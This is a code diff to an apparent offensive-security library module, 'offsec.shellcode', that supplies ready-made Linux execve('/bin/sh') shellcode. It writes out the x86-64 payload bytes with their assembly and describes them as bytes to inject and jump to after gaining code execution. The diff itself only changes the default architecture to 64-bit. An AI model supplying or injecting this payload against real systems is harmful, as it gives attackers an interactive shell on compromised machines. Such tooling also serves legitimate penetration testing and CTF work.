@@ -1,6 +1,7 @@
 # offsec.shellcode: ready-made shellcode, the raw machine-code bytes to inject and jump to.
 #
-#     const sc: vector[u8] = shellcode.sh(Width.Bits64)   # execve("/bin/sh", 0, 0)
+#     const sc: vector[u8] = shellcode.sh()               # execve("/bin/sh", 0, 0), x86-64
+#     const sc32: vector[u8] = shellcode.sh(Width.Bits32)
 #
 # These are the standard, null-free Linux `execve("/bin/sh")` payloads — the usual "you have
 # code execution, now spawn a shell" primitive. Drop them in a `payload.Part.Bytes`, or inject
@@ -8,10 +9,10 @@
 
 from binary import Width
 
-# `execve("/bin/sh", NULL, NULL)`, null-free, for the given class.
-manual fn sh(bits: Width) -> vector[u8]:
+# `execve("/bin/sh", NULL, NULL)`, null-free, for the given class (x86-64 by default).
+manual fn sh(width: Width = Width.Bits64) -> vector[u8]:
     mut out: vector[u8] = []
-    if bits == Width.Bits64:
+    if width == Width.Bits64:
         # xor rsi,rsi; push rsi; movabs rdi,"/bin//sh"; push rdi; push rsp; pop rsi;
         # push 0x3b; pop rax; cdq; syscall
         for b in [0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54, 0x5e, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05]:
